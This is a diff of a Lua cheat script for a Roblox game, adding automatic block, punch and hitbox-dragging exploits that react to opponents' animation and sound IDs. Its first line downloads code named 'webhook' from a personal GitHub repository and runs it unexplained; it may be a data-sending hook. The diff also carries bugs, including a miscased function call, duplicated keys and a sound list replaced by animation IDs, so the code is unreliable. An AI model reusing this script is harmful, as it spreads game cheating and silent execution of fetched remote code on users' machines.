@@ -1,3 +1,4 @@
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
 
 local allowed = {
@@ -11,6 +12,9 @@ end
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+
+
 
 -- Tạo cửa sổ Fluent chính
 local Window = Fluent:CreateWindow({
@@ -3145,10 +3149,8 @@ do
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local localPlayer = Players.LocalPlayer
     
-    -- Services
     local testRemote = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent")
     
-    -- Killer names
     local Killers = {
         ["Slasher"] = true,
         ["1x1x1x1"] = true,
@@ -3165,114 +3167,102 @@ do
         return Killers[char.Name] == true
     end
     
-    -- Animation IDs that trigger auto block
     local animationIds = {
-        ["83829782357897"] = true,
-        ["126830014841198"] = true,
-        ["126355327951215"] = true,
-        ["121086746534252"] = true,
-        ["105458270463374"] = true,
-        ["18885909645"] = true,
-        ["94162446513587"] = true,
-        ["93069721274110"] = true,
-        ["97433060861952"] = true,
-        ["121293883585738"] = true,
-        ["92173139187970"] = true,
-        ["106847695270773"] = true,
-        ["125403313786645"] = true,
-        ["81639435858902"] = true,
-        ["137314737492715"] = true,
-        ["120112897026015"] = true,
-        ["82113744478546"] = true,
-        ["118298475669935"] = true,
+        ["83829782357897"]  = true, -- Slash, 1x1x1x1
+        ["126830014841198"] = true, -- Slash, Jason
+        ["126355327951215"] = true, -- Behead, Jason
+        ["121086746534252"] = true, -- GashingWoundStart, Jason
+        ["105458270463374"] = true, -- Slash, JohnDoe
+        ["18885909645"]     = true, -- Attack, c00lkid
+        ["94162446513587"]  = true, -- Slash, JohnDoe, Skin: !Joner
+        ["93069721274110"]  = true, -- Slash, JohnDoe, Skin: AnnihilationJohnDoe
+        ["97433060861952"]  = true, -- Slash, JohnDoe, Skin: #SK
+        ["121293883585738"] = true, -- Slash, 1x1x1x1
+        ["92173139187970"]  = true, -- Slash, Skin: Hacklord1x1x1x1
+        ["106847695270773"] = true, -- GashingWoundStart, Jason, Skin: Subject0Jason
+        ["125403313786645"] = true, -- Slash, Jason, Skin: Subject0Jason
+        ["81639435858902"]  = true, -- Behead, Jason, Skin: WhitePumpkinJason
+        ["137314737492715"] = true, -- GashingWoundStart, Jason, Skin: WhitePumpkinJason
+        ["120112897026015"] = true, -- Slash, Jason, Skin: WhitePumpkinJason
+        ["82113744478546"]  = true, -- Behead, Jason (nhiều skin)
+        ["118298475669935"] = true, -- Slash, Jason (nhiều skin)
+        ["126681776859538"] = true, -- Behead, Jason, Skin: PursuerJason
+        ["129976080405072"] = true, -- GashingWoundStart, Jason, Skin: PursuerJason
+        ["109667959938617"] = true, -- Slash, Jason, Skin: PursuerJason
+        ["74707328554358"]  = true, -- Slash, Jason, Skin: #DeadRabbitsJason
+        ["133336594357903"] = true, -- Behead, Jason, Skin: #DeadRabbitsJason
+        ["86204001129974"]  = true, -- GashingWoundStart, Jason, Skin: #DeadRabbitsJason
+        ["70371667919898"]  = true, -- Attack, c00lkidd, Skin: MafiosoC00l
+        ["131543461321709"] = true, -- Attack, c00lkidd, Skin: SaviorC00l
+        ["106776364623742"] = true, -- Walkspeed Overing, c00lkidd (all skins)
+        ["136323728355613"] = true, -- Swing, Noli
+        ["109230267448394"] = true, -- Swing, Noli (all skins)
+        ["139835501033932"] = true, -- VoidRush, Noli (all skins)
+        ["114356208094580"] = true, -- VoidRush2, Noli
+        ["106538427162796"] = true, -- Stab, All Noli
+        ["126896426760253"] = true, -- VoidRush, Noli
+        ["131430497821198"] = true, -- MassInfection, 1x1x1x1
+        ["100592913030351"] = true, -- MassInfection, 1x1x1x1 (Fleskhjerta/AceOfSpades/Lancer)
+        ["70447634862911"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 Old
+        ["83685305553364"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 New
+        ["126171487400618"]  = true, -- Slash, Skin: Hacklord1x1x1x1
+        ["97167027849946"]  = true,
+        ["99135633258223"]  = true,
+        ["98456918873918"]  = true,
+        ["83251433279852"]  = true,
         ["126681776859538"] = true,
         ["129976080405072"] = true,
-        ["109667959938617"] = true,
-        ["74707328554358"] = true,
-        ["133336594357903"] = true,
-        ["86204001129974"] = true,
-        ["70371667919898"] = true,
-        ["131543461321709"] = true,
-        ["106776364623742"] = true,
-        ["136323728355613"] = true,
-        ["109230267448394"] = true,
-        ["139835501033932"] = true,
-        ["114356208094580"] = true,
-        ["106538427162796"] = true,
-        ["126896426760253"] = true,
-        ["131430497821198"] = true,
-        ["100592913030351"] = true,
-        ["70447634862911"] = true,
-        ["83685305553364"] = true,
-        ["126171487400618"] = true,
-        ["97167027849946"] = true,
-        ["99135633258223"] = true,
-        ["98456918873918"] = true,
-        ["83251433279852"] = true,
-        ["122709416391891"] = true,
-        ["87989533095285"] = true,
-        ["139309647473555"] = true,
-        ["133363345661032"] = true,
-        ["128414736976503"] = true,
-        ["121808371053483"] = true,
-        ["77375846492436"] = true,
-        ["92445608014276"] = true,
-        ["100358581940485"] = true,
-        ["91758760621955"] = true,
-        ["94634594529334"] = true,
-        ["90620531468240"] = true,
-        ["94958041603347"] = true,
-        ["131642454238375"] = true,
-        ["110702884830060"] = true,
-        ["76312020299624"] = true,
-        ["126654961540956"] = true,
-        ["139613699193400"] = true,
-        ["91509234639766"] = true,
+        ["122709416391891"] = true, -- Đánh Thường Guest 666
+        ["87989533095285"] = true, -- Vồ Tới Guest 666
     }
     
-    -- Sound Auto Block IDs
     local autoBlockTriggerSounds = {
-        ["102228729296384"] = true,
-        ["140242176732868"] = true,
-        ["112809109188560"] = true,
-        ["136323728355613"] = true,
-        ["115026634746636"] = true,
-        ["84116622032112"] = true,
-        ["108907358619313"] = true,
-        ["127793641088496"] = true,
-        ["86174610237192"] = true,
-        ["95079963655241"] = true,
-        ["101199185291628"] = true,
-        ["119942598489800"] = true,
-        ["84307400688050"] = true,
-        ["113037804008732"] = true,
-        ["105200830849301"] = true,
-        ["75330693422988"] = true,
-        ["82221759983649"] = true,
-        ["81702359653578"] = true,
-        ["108610718831698"] = true,
-        ["112395455254818"] = true,
-        ["109431876587852"] = true,
-        ["109348678063422"] = true,
-        ["85853080745515"] = true,
-        ["12222216"] = true,
-        ["105840448036441"] = true,
-        ["114742322778642"] = true,
-        ["119583605486352"] = true,
-        ["79980897195554"] = true,
-        ["71805956520207"] = true,
-        ["79391273191671"] = true,
-        ["89004992452376"] = true,
-        ["101553872555606"] = true,
-        ["101698569375359"] = true,
-        ["106300477136129"] = true,
-        ["116581754553533"] = true,
-        ["117231507259853"] = true,
-        ["119089145505438"] = true,
-        ["121954639447247"] = true,
-        ["125213046326879"] = true,
-        ["131406927389838"] = true,
-        ["71834552297085"] = true,
+        ["83829782357897"]  = true, -- Slash, 1x1x1x1
+        ["126830014841198"] = true, -- Slash, Jason
+        ["126355327951215"] = true, -- Behead, Jason
+        ["121086746534252"] = true, -- GashingWoundStart, Jason
+        ["105458270463374"] = true, -- Slash, JohnDoe
+        ["18885909645"]     = true, -- Attack, c00lkid
+        ["94162446513587"]  = true, -- Slash, JohnDoe, Skin: !Joner
+        ["93069721274110"]  = true, -- Slash, JohnDoe, Skin: AnnihilationJohnDoe
+        ["97433060861952"]  = true, -- Slash, JohnDoe, Skin: #SK
+        ["121293883585738"] = true, -- Slash, 1x1x1x1
+        ["92173139187970"]  = true, -- Slash, Skin: Hacklord1x1x1x1
+        ["106847695270773"] = true, -- GashingWoundStart, Jason, Skin: Subject0Jason
+        ["125403313786645"] = true, -- Slash, Jason, Skin: Subject0Jason
+        ["81639435858902"]  = true, -- Behead, Jason, Skin: WhitePumpkinJason
+        ["137314737492715"] = true, -- GashingWoundStart, Jason, Skin: WhitePumpkinJason
+        ["120112897026015"] = true, -- Slash, Jason, Skin: WhitePumpkinJason
+        ["82113744478546"]  = true, -- Behead, Jason (nhiều skin)
+        ["118298475669935"] = true, -- Slash, Jason (nhiều skin)
+        ["126681776859538"] = true, -- Behead, Jason, Skin: PursuerJason
+        ["129976080405072"] = true, -- GashingWoundStart, Jason, Skin: PursuerJason
+        ["109667959938617"] = true, -- Slash, Jason, Skin: PursuerJason
+        ["74707328554358"]  = true, -- Slash, Jason, Skin: #DeadRabbitsJason
+        ["133336594357903"] = true, -- Behead, Jason, Skin: #DeadRabbitsJason
+        ["86204001129974"]  = true, -- GashingWoundStart, Jason, Skin: #DeadRabbitsJason
+        ["70371667919898"]  = true, -- Attack, c00lkidd, Skin: MafiosoC00l
+        ["131543461321709"] = true, -- Attack, c00lkidd, Skin: SaviorC00l
+        ["106776364623742"] = true, -- Walkspeed Overing, c00lkidd (all skins)
+        ["136323728355613"] = true, -- Swing, Noli
+        ["109230267448394"] = true, -- Swing, Noli (all skins)
+        ["139835501033932"] = true, -- VoidRush, Noli (all skins)
+        ["114356208094580"] = true, -- VoidRush2, Noli
+        ["106538427162796"] = true, -- Stab, All Noli
+        ["126896426760253"] = true, -- VoidRush, Noli
+        ["131430497821198"] = true, -- MassInfection, 1x1x1x1
+        ["100592913030351"] = true, -- MassInfection, 1x1x1x1 (Fleskhjerta/AceOfSpades/Lancer)
+        ["70447634862911"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 Old
+        ["83685305553364"]  = true, -- MassInfection, Skin: Hacklord1x1x1x1 New
+        ["126171487400618"]  = true, -- Slash, Skin: Hacklord1x1x1x1
+        ["97167027849946"]  = true,
+        ["99135633258223"]  = true,
+        ["98456918873918"]  = true,
+        ["83251433279852"]  = true,
+        ["126681776859538"] = true,
+        ["129976080405072"] = true,
+        ["122709416391891"] = true, -- Đánh Thường Guest 666
+        ["87989533095285"] = true, -- Vồ Tới Guest 666
     }
     
     local walkspeedOverrideId = "106776364623742"
@@ -3283,18 +3273,16 @@ do
     local frontCircleSize = 8
     local defaultFrontCircleSize = 8
     
-    -- Predictive Block
     local predictiveBlockOn = false
     local edgeKillerDelay = 3
+    
     local killerInRangeSince = nil
     local predictiveCooldown = 0
     
-    -- Sound Auto Block
     local autoBlockAudioOn = false
     local soundHooks = {}
     local soundBlockedUntil = {}
     
-    -- Auto Adjust Delay
     local autoAdjustDBTFBPS = false
     local _savedManualAntiFlickDelay = 0
     local killerDelayMap = {
@@ -3306,23 +3294,19 @@ do
         ["noli"]     = 0.15,
     }
     
-    -- Double Block Tech
     local doubleblocktech = false
     
-    -- Message When Block
     local messageWhenAutoBlockOn = false
     local messageWhenAutoBlock = ""
     local _lastBlockMessageTime = 0
     local MESSAGE_BLOCK_COOLDOWN = 0.6
     
-    -- Hitbox Dragging Tech
     local hitboxDraggingTech = false
     local _hitboxDraggingDebounce = false
     local HITBOX_DRAG_DURATION = 1.4
     local Dspeed = 5.6
     local Ddelay = 0
     
-    -- Auto Punch
     local killerNames = {"c00lkidd", "Jason", "JohnDoe", "1x1x1x1", "Noli", "Slasher", "Sixer"}
     local autoPunchOn = false
     local aimPunch = false
@@ -3333,6 +3317,7 @@ do
     local AIM_WINDOW = 0.5
     local AIM_COOLDOWN = 0.6
     local lastAimTrigger = {}
+    
     local messageWhenAutoPunchOn = false
     local messageWhenAutoPunch = ""
     local _lastPunchMessageTime = 0
@@ -3349,10 +3334,8 @@ do
         "86096387000557"
     }
     
-    -- Detection circles for Auto Check V3
     local detectionCircles = {}
     
-    -- Cached Animator
     local cachedAnimator = nil
     
     local function fireGuiBlock()
@@ -3396,6 +3379,8 @@ do
         pcall(function() channel:SendAsync(text) end)
     end
     
+    
+    -- Lấy các flag và cập nhật liên tục
     local toggleFlag = getBoolFlag("AutoBlockToggle", false)
     local strictFlag = getBoolFlag("AutoBlockStrictRange", false)
     local predictiveFlag = getBoolFlag("PredictiveBlock", false)
@@ -3411,6 +3396,7 @@ do
     local flingPunchFlag = getBoolFlag("FlingPunch", false)
     local messagePunchFlag = getBoolFlag("MessageWhenPunch", false)
     
+    -- Khởi tạo giá trị ban đầu
     toggleOn = toggleFlag.Value
     strictRangeOn = strictFlag.Value
     predictiveBlockOn = predictiveFlag.Value
@@ -3420,64 +3406,62 @@ do
     defaultFrontCircleSize = rangeFlag.Value * 0.44
     edgeKillerDelay = delayFlag.Value
     autoBlockAudioOn = audioFlag.Value
+    
     autoAdjustDBTFBPS = adjustFlag.Value
     doubleblocktech = doubleFlag.Value
     messageWhenAutoBlockOn = messageFlag.Value
     hitboxDraggingTech = dragFlag.Value
     autoPunchOn = autoPunchFlag.Value
     aimPunch = aimPunchFlag.Value
-    flingPunchOn = flingPunchFlag.Value
+    flingPunchOn = false
     messageWhenAutoPunchOn = messagePunchFlag.Value
     
+    -- Cập nhật trạng thái liên tục từ flags
+    task.spawn(function()
+        while true do
+            task.wait(0.1)
+            toggleOn = toggleFlag.Value
+            strictRangeOn = strictFlag.Value
+            predictiveBlockOn = predictiveFlag.Value
+            detectionRange = rangeFlag.Value
+            frontCircleSize = rangeFlag.Value * 0.44
+            edgeKillerDelay = delayFlag.Value
+            autoBlockAudioOn = audioFlag.Value
+            autoAdjustDBTFBPS = adjustFlag.Value
+            doubleblocktech = doubleFlag.Value
+            messageWhenAutoBlockOn = messageFlag.Value
+            hitboxDraggingTech = dragFlag.Value
+            autoPunchOn = autoPunchFlag.Value
+            aimPunch = aimPunchFlag.Value
+            messageWhenAutoPunchOn = messagePunchFlag.Value
+        end
+    end)
+    
+    
     Tabs.Main:AddToggle("AutoBlockV3", {
-        Title = "Auto Block V3", 
+        Title = "Auto Block", 
         Default = toggleOn, 
         Callback = function(Value) 
             toggleOn = Value 
             toggleFlag.Value = Value 
+            predictiveBlockOn = Value
+            predictiveFlag.Value = Value
+            autoAdjustDBTFBPS = Value
+            adjustFlag.Value = Value
+            doubleblocktech = Value
+            doubleFlag.Value = Value
+            hitboxDraggingTech = Value
+            dragFlag.Value = Value
         end
     })
     
-    Tabs.Main:AddToggle("AutoCheckV3", {
-        Title = "Auto Check V3", 
+    
+    Tabs.Main:AddToggle("ShowCircle", {
+        Title = "Show Detection Circle", 
         Default = strictRangeOn, 
         Callback = function(Value) 
             strictRangeOn = Value 
             strictFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddInput("RangeCheckInput", {
-        Title = "Range Check", 
-        Default = tostring(detectionRange), 
-        Placeholder = "Enter detection range", 
-        Callback = function(Value) 
-            local val = tonumber(Value) 
-            if val then 
-                detectionRange = val 
-                defaultRange = val 
-                frontCircleSize = val * 0.44
-                defaultFrontCircleSize = val * 0.44
-                rangeFlag.Value = val 
-            end 
-        end
-    })
-    
-    Tabs.Main:AddToggle("AutoAdjustDelay", {
-        Title = "Auto Adjust Delay", 
-        Default = autoAdjustDBTFBPS, 
-        Callback = function(Value) 
-            autoAdjustDBTFBPS = Value
-            adjustFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddToggle("DoubleBlockTech", {
-        Title = "Double Block Tech", 
-        Default = doubleblocktech, 
-        Callback = function(Value) 
-            doubleblocktech = Value
-            doubleFlag.Value = Value
         end
     })
     
@@ -3499,109 +3483,14 @@ do
         end
     })
     
-    Tabs.Main:AddToggle("HitboxDragging", {
-        Title = "Hitbox Dragging Tech", 
-        Default = hitboxDraggingTech, 
-        Callback = function(Value) 
-            hitboxDraggingTech = Value
-            dragFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddSlider("DragSpeed", {
-        Title = "Drag Speed", 
-        Min = 1, 
-        Max = 20, 
-        Default = 5.6, 
-        Rounding = 1, 
-        Callback = function(Value) 
-            Dspeed = Value 
-        end
-    })
-    
-    Tabs.Main:AddSlider("DragDelay", {
-        Title = "Drag Delay", 
-        Min = 0, 
-        Max = 2, 
-        Default = 0, 
-        Rounding = 2, 
-        Callback = function(Value) 
-            Ddelay = Value 
-        end
-    })
-    
-    Tabs.Main:AddToggle("PredictiveBlock", {
-        Title = "Predictive Block", 
-        Default = predictiveBlockOn, 
-        Callback = function(Value) 
-            predictiveBlockOn = Value 
-            predictiveFlag.Value = Value 
-        end
-    })
-    
-    Tabs.Main:AddInput("RangeCheckInput", {
-        Title = "Range Check", 
-        Default = tostring(detectionRange), 
-        Placeholder = "Enter detection range", 
-        Callback = function(Value) 
-            local val = tonumber(Value) 
-            if val then 
-                detectionRange = val 
-                defaultRange = val 
-                frontCircleSize = val * 0.44
-                defaultFrontCircleSize = val * 0.44
-                rangeFlag.Value = val 
-            end 
-        end
-    })
-    
-    Tabs.Main:AddSlider("EdgeKillerDelay", {
-        Title = "Edge Killer Delay", 
-        Min = 1, 
-        Max = 10, 
-        Default = 3, 
-        Rounding = 1, 
-        Callback = function(Value) 
-            edgeKillerDelay = Value 
-            delayFlag.Value = Value 
-        end
-    })
-    
     Tabs.Main:AddToggle("AutoPunch", {
         Title = "Auto Punch", 
         Default = autoPunchOn, 
         Callback = function(Value) 
             autoPunchOn = Value
             autoPunchFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddToggle("AimPunch", {
-        Title = "Aim Punch", 
-        Default = aimPunch, 
-        Callback = function(Value) 
             aimPunch = Value
             aimPunchFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddToggle("FlingPunch", {
-        Title = "Fling Punch", 
-        Default = flingPunchOn, 
-        Callback = function(Value) 
-            flingPunchOn = Value
-            flingPunchFlag.Value = Value
-        end
-    })
-    
-    Tabs.Main:AddSlider("FlingPower", {
-        Title = "Fling Power", 
-        Min = 1000, 
-        Max = 50000, 
-        Default = 10000, 
-        Rounding = 1000, 
-        Callback = function(Value) 
-            flingPower = Value 
         end
     })
     
@@ -3665,12 +3554,69 @@ do
         ["101101433684051"] = true
     }
     
+    local function belongsToMe(model)
+        if not model or not model:IsA("Model") then return false end
+        local hum = model:FindFirstChild("Humanoid")
+        if not hum then return false end
+        local desc = hum:FindFirstChild("creator")
+        if desc and desc.Value == localPlayer then
+            return true
+        end
+        return false
+    end
+    
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- Hàm kiểm tra bạn có phải Guest1337 hay không
+local function isMyGuest()
+    local char = lp.Character
+    if not char then return false end
+    return char.Name == "Guest1337"
+end
+
+-- In ra đúng 1 lần duy nhất khi thay đổi trạng thái
+local lastState = nil
+
+task.spawn(function()
+    while task.wait(0.5) do
+        local state = IsMyGuest()
+
+        if state ~= lastState then
+            if state then
+                print("✔ Bạn đang là Guest1337!")
+            else
+                print("✘ Bạn KHÔNG phải Guest1337!")
+            end
+        end
+
+        lastState = state
+    end
+end)
+
+
+-- Loop check liên tục (giống code của bạn)
+task.spawn(function()
+    while task.wait(0.5) do
+        if toggleOn or autoPunchOn then
+            isMyGuest()  -- chỉ trả về true/false
+        end
+    end
+end)
+
+    
     local function onAnimationPlayed(player, char, track)
         if not toggleOn then return end
+        if not isMyGuest() then return end
+        if not isKiller(player) then return end -- FIX: Thêm check isKiller
         if not (track and track.Animation) then return end
         local animIdStr = track.Animation.AnimationId
         local id = animIdStr and string.match(animIdStr, "%d+")
         if not id or not animationIds[id] then return end
+        
         
         if id == walkspeedOverrideId then
             detectionRange = 40
@@ -3679,24 +3625,36 @@ do
                 detectionRange = defaultRange
                 frontCircleSize = defaultFrontCircleSize
             end)
+        
         end
         
         local myChar = localPlayer.Character
         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
         local root = char and char:FindFirstChild("HumanoidRootPart")
         if not myRoot or not root then return end
+        
+        -- Kiểm tra khoảng cách tổng quát
         local dist = (root.Position - myRoot.Position).Magnitude
         if dist > detectionRange then return end
         
-        -- Luôn check vòng tròn (không cần bật strictRangeOn)
-        local distToCircle = (myRoot.Position - (root.Position + root.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
-        local isInsideCircle = distToCircle <= frontCircleSize
-        if not isInsideCircle then return end
+        -- CHỈ kiểm tra vòng tròn phía trước KHI strictRangeOn = true
+        if strictRangeOn then
+            local distToCircle = (myRoot.Position - (root.Position + root.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
+            local isInsideCircle = distToCircle <= frontCircleSize
+            
+            if not isInsideCircle then return end
+        else
+            -- Khi TẮT strictRangeOn, vẫn giả lập có vòng tròn ảo phía trước
+            local distToCircle = (myRoot.Position - (root.Position + root.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
+            local isInsideCircle = distToCircle <= frontCircleSize
+            if not isInsideCircle then return end
+        end
         
         if shouldBlockNow(player, id, track) then
             if myRoot and root then
                 myRoot.CFrame = CFrame.lookAt(myRoot.Position, root.Position)
             end
+            
             
             if massInfectionIds[id] then
                 task.delay(0.5, fireGuiBlock)
@@ -3705,6 +3663,7 @@ do
             end
             
             if doubleblocktech then
+                
                 fireGuiPunch()
             end
             
@@ -3743,7 +3702,7 @@ do
     Players.PlayerAdded:Connect(onPlayerAdded)
     Players.PlayerRemoving:Connect(cleanupPlayerConns)
     
-    -- Detection circles for Auto Check V3
+    
     local frontCircles = {}
     
     local function createFrontCircle(player, hrp)
@@ -3755,6 +3714,8 @@ do
         frontCircle.Material, frontCircle.Transparency = Enum.Material.Neon, 0.5
         frontCircle.Color = Color3.fromRGB(255, 0, 0)
         frontCircle.Parent = workspace
+        frontCircle.CanQuery = false
+        frontCircle.CanTouch = false
         frontCircles[player] = frontCircle
     end
     
@@ -3772,76 +3733,86 @@ do
         
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= localPlayer then
+                
                 local char = player.Character
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
                 local hum = char and char:FindFirstChildOfClass("Humanoid")
                 
                 if hrp and hum and hum.Health > 0 and isKiller(player) then
+                    
                     if strictRangeOn then
-                        -- Hiển thị vòng tròn khi bật Auto Check V3
                         if not frontCircles[player] then createFrontCircle(player, hrp) end
                         local frontCircle = frontCircles[player]
                         frontCircle.Size = Vector3.new(0.2, frontCircleSize * 2, frontCircleSize * 2)
                         
                         local yOffset = -3
                         local frontOffset = hrp.CFrame.LookVector * 4
+                        
                         frontCircle.CFrame = CFrame.new(hrp.Position + frontOffset + Vector3.new(0, yOffset, 0)) * CFrame.Angles(0, 0, math.rad(90))
                         
                         local distToCircle = (myRoot.Position - (hrp.Position + hrp.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
+                        
                         local isInsideCircle = distToCircle <= frontCircleSize
                         frontCircle.Color = isInsideCircle and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
                         frontCircle.Transparency = 0.5
                     else
-                        -- Ẩn vòng tròn khi tắt Auto Check V3
+                        
                         removeCircle(player)
                     end
                 else
                     removeCircle(player)
                 end
             end
+            
         end
     end)
     
     Players.PlayerRemoving:Connect(removeCircle)
     
-    -- Predictive Auto Block
     RunService.RenderStepped:Connect(function()
-        if predictiveBlockOn and tick() > predictiveCooldown then
-            local killersFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Killers")
-            local myChar = localPlayer.Character
-            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
-            local myHum = myChar and myChar:FindFirstChild("Humanoid")
+        if not predictiveBlockOn then return end
+        if not isMyGuest() then return end
+        if tick() <= predictiveCooldown then return end
+        local killersFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Killers")
+        local myChar = localPlayer.Character
+        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        local myHum = myChar and myChar:FindFirstChild("Humanoid")
 
-            if killersFolder and myHRP and myHum then
-                local killerInRange = false
+        if killersFolder and myHRP and myHum then
+            local killerInRange = false
 
-                for _, killer in ipairs(killersFolder:GetChildren()) do
-                    local hrp = killer:FindFirstChild("HumanoidRootPart")
+            for _, killerModel in ipairs(killersFolder:GetChildren()) do
+                -- FIX: Check if the model is actually a killer by name
+                if Killers[killerModel.Name] then
+                    local hrp = killerModel:FindFirstChild("HumanoidRootPart")
                     if hrp then
+                        
                         local dist = (myHRP.Position - hrp.Position).Magnitude
                         if dist <= detectionRange then
                             killerInRange = true
                             break
+                            
                         end
                     end
                 end
+            end
 
-                if killerInRange then
-                    if not killerInRangeSince then
-                        killerInRangeSince = tick()
-                    elseif tick() - killerInRangeSince >= edgeKillerDelay then
-                        fireGuiBlock()
-                        predictiveCooldown = tick() + 2
-                        killerInRangeSince = nil
-                    end
-                else
+            if killerInRange then
+                if not killerInRangeSince then
+                    killerInRangeSince = tick()
+                    
+                elseif tick() - killerInRangeSince >= edgeKillerDelay then
+                    fireGuiBlock()
+                    predictiveCooldown = tick() + 2
                     killerInRangeSince = nil
+                    
                 end
+            else
+                killerInRangeSince = nil
             end
         end
     end)
     
-    -- Sound Auto Block Logic
     local function extractNumericSoundId(sound)
         if not sound then return nil end
         local sid = sound.SoundId
@@ -3862,11 +3833,13 @@ do
         if parent then
             if parent:IsA("BasePart") then
                 return parent.Position, parent
+                
             end
             if parent:IsA("Attachment") then
                 local gp = parent.Parent
                 if gp and gp:IsA("BasePart") then
                     return gp.Position, gp
+                    
                 end
             end
         end
@@ -3875,6 +3848,7 @@ do
     
     local function attemptBlockForSound(sound, idParam)
         if not toggleOn then return end
+        if not isMyGuest() then return end
         if not sound or not sound:IsA("Sound") then return end
         if not sound.IsPlaying then return end
         
@@ -3885,6 +3859,7 @@ do
         if soundBlockedUntil[sound] and now < soundBlockedUntil[sound] then return end
         
         local myChar = localPlayer.Character
+        
         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
         if not myRoot then return end
         
@@ -3897,18 +3872,29 @@ do
         local hrp = char:FindFirstChild("HumanoidRootPart")
         if not hrp then return end
         
+        -- FIX: Check if the model/character is one of the defined killers
+        if not Killers[char.Name] then return end 
+
         local dist = (hrp.Position - myRoot.Position).Magnitude
         if dist > detectionRange then return end
         
-        -- Luôn check vòng tròn (không cần bật strictRangeOn)
-        local distToCircle = (myRoot.Position - (hrp.Position + hrp.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
-        local isInsideCircle = distToCircle <= frontCircleSize
-        if not isInsideCircle then return end
+        -- CHỈ kiểm tra vòng tròn phía trước KHI strictRangeOn = true
+        if strictRangeOn then
+            local distToCircle = (myRoot.Position - (hrp.Position + hrp.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
+            local isInsideCircle = distToCircle <= frontCircleSize
+            if not isInsideCircle then return end
+        else
+            -- Khi TẮT strictRangeOn, vẫn giả lập có vòng tròn ảo phía trước
+            local distToCircle = (myRoot.Position - (hrp.Position + hrp.CFrame.LookVector * 4 + Vector3.new(0, -3, 0))).Magnitude
+            local isInsideCircle = distToCircle <= frontCircleSize
+            if not isInsideCircle then return end
+        end
         
         myRoot.CFrame = CFrame.lookAt(myRoot.Position, hrp.Position)
         
         fireGuiBlock()
         if doubleblocktech then
+            
             fireGuiPunch()
         end
         
@@ -3917,6 +3903,7 @@ do
                 sendChatMessage(messageWhenAutoBlock)
                 _lastBlockMessageTime = tick()
             end
+            
         end
         
         soundBlockedUntil[sound] = now + 1.2
@@ -3936,6 +3923,7 @@ do
         local propConn = sound:GetPropertyChangedSignal("IsPlaying"):Connect(function()
             if sound.IsPlaying then
                 attemptBlockForSound(sound, preId)
+                
             end
         end)
         
@@ -3944,6 +3932,7 @@ do
             if playedConn and playedConn.Connected then playedConn:Disconnect() end
             if propConn and propConn.Connected then propConn:Disconnect() end
             if destroyConn and destroyConn.Connected then destroyConn:Disconnect() end
+            
             soundHooks[sound] = nil
             soundBlockedUntil[sound] = nil
         end)
@@ -3966,7 +3955,6 @@ do
         end
     end)
     
-    -- Auto Adjust Delay Logic
     local function getNearestKillerModel()
         local myChar = localPlayer.Character
         local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
@@ -3974,13 +3962,15 @@ do
 
         local closest, closestDist = nil, math.huge
         for _, k in ipairs(KillersFolder:GetChildren()) do
-            if k and k:IsA("Model") then
+            if k and k:IsA("Model") and Killers[k.Name] then -- FIX: Check if the model is actually a killer by name
                 local hrp = k:FindFirstChild("HumanoidRootPart")
                 if hrp then
+                    
                     local d = (hrp.Position - myRoot.Position).Magnitude
                     if d < closestDist then
                         closest, closestDist = k, d
                     end
+                    
                 end
             end
         end
@@ -3992,6 +3982,7 @@ do
         if not autoAdjustDBTFBPS then return end
         adjustTicker = adjustTicker + dt
         if adjustTicker < 0.15 then return end
+        
         adjustTicker = 0
 
         local nearest = getNearestKillerModel()
@@ -4000,11 +3991,11 @@ do
             local mapped = killerDelayMap[key]
             if mapped ~= nil then
                 _savedManualAntiFlickDelay = mapped
+                
             end
         end
     end)
     
-    -- Hitbox Dragging Tech Logic
     local function getKillerHRP(killerModel)
         if not killerModel then return nil end
         if killerModel:FindFirstChild("HumanoidRootPart") then
@@ -4014,18 +4005,18 @@ do
     end
     
     local function beginDragIntoKiller(killerModel)
+        
         if _hitboxDraggingDebounce then return end
         if not killerModel or not killerModel.Parent then return end
         
         local char = localPlayer.Character
         if not char then return end
-        
         local hrp = char:FindFirstChild("HumanoidRootPart")
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if not hrp or not humanoid then return end
-        
         local targetHRP = getKillerHRP(killerModel)
         if not targetHRP then return end
+        
         
         _hitboxDraggingDebounce = true
         
@@ -4043,6 +4034,7 @@ do
         local conn
         conn = RunService.Heartbeat:Connect(function()
             if not _hitboxDraggingDebounce then
+                
                 conn:Disconnect()
